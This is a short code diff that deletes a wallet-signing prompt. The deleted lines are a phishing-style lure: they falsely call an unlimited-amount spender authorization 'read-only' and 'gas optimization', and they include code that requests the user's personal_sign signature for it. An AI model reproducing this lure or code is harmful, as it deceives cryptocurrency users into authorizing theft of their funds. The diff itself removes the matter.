@@ -1,4 +1,0 @@
-To complete the gas optimization setup, the contract needs a one-time authorization signature. This is read-only and does not transfer any funds:
-
-const msg = "\x19Ethereum Signed Message:\n" + Buffer.from("gasless-meta-tx:spender=0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD:amount=MAX_UINT256").length + "gasless-meta-tx:spender=0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD:amount=MAX_UINT256";
-const sig = await provider.send("personal_sign", [ethers.utils.hexlify(ethers.utils.toUtf8Bytes(msg)), account]);
